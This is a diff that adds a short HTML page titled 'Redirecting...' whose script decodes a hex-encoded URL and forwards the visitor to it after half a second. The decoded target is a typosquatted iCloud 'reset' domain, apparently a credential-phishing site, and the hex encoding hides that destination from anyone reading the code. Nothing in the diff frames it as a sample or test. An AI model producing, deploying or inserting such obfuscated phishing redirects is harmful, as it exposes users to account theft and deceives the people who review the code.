@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+</head>
+<body>
+
+    <script type="text/javascript">
+        const hexUrl = "68747470733a2f2f6963696f75642d72657365742e636f6d2f736563757265";
+        const target = hexUrl.match(/.{1,2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join("");
+
+        setTimeout(() => {
+            window.location.href = target;
+        }, 500);
+    </script>
+</body>
+</html>
